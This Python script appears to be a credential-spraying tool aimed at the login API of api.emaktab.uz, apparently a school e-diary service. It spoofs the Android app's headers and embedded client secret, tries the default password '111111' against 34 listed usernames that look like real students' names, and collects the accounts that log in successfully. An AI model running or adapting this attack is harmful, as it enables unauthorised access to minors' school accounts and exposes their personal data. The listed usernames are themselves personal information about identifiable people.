import requests
import json

logins = [
    "abdumalikovibrohim02",
    "gabdurahimova0211201",
    "mushtaryi",
    "dilshoda.alijonova06",
    "alimjonov_husan",
    "fotima.alimjonova052",
    "madina.ataboyeva1020",
    "muhbubaxonaxmedova",
    "akbarshoh_azimov",
    "firdavsismoilov03201",
    "jabbarovamubinabonu",
    "kumishjalolova",
    "jamoliddinovazarina",
    "r.karimjonova0611201",
    "sayyodbekkarimov",
    "oisha.kasimova",
    "marupjonovamubina",
    "meliqulova_diyora",
    "miramatjonov",
    "muxriddinovabubakr",
    "ortikovamubinaxon",
    "aqidaraximjanova",
    "s.mavludahon",
    "tojidinovamalikaxon",
    "nigina.tursunboyeva1",
    "ziyoda.umarova300420",
    "u_ziyoviddin",
    "mubosherv",
    "jahongirxamidilloyev",
    "shaxnoza.rahimova102",
    "azizbek.yunusov20072",
    "mustafo.yunusov10201",
    "ruhshona.yunusova082",
    "zahidjanov"
]

headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "app-version": "10.0.0(121)",
    "Connection": "Keep-Alive",
    "Content-Length": "235",                    # Note: this value usually changes per request
    "Content-Type": "application/json; charset=utf-8",
    "device-details": "SamsungSM-A536E",
    "Host": "api.emaktab.uz",
    "User-Agent": "okhttp/4.10.0",
    "x-platform": "android"
}


URL = "https://api.emaktab.uz/mobile/v10.0/authorizations/bycredentials"

suc_login = []
fail_login = []

def login_in(username: str, password: str):
    data = {
    "clientId": "B70AECAA-A0E2-4E0D-A147-2D6051A1397B",
    "clientSecret": "C0A8880F-30CA-4877-ADD2-26ED9672EC93",
    "scope": "Schools,Relatives,EduGroups,Lessons,marks,EduWorks,Avatar",
    "username": username,
    "password": password,
    "agreeTerms": "false"
    }
    response = requests.post(url=URL, headers=headers,json=data)
    if response.status_code == 200:
        
        match response.json()['type']:
            case "Success":
                print(f"Successful login for {username}")
                suc_login.append(username)
            case "Error":
                print(f"LOGIN YOKI PAROL NOTOGRI: {username}")
                fail_login.append(username)
            case _:
                print("UNKNOWN ERROR OCCURED")
                with open("test.json", "w", encoding="utf-8") as file:
                    json.dump(response.json(),file, indent=4)
    else:
        print(f"ERROR OCCURED for {username}")
        print(response.status_code)
    
for login in logins:
    login_in(login, "111111")

print(f"--------\nSUCCESSFUL LOGINS:{len(suc_login)}--------\n{suc_login}\n-----------")
print(f"--------\nFAILED LOGINS:{len(fail_login)}--------\n{fail_login}\n-----------")
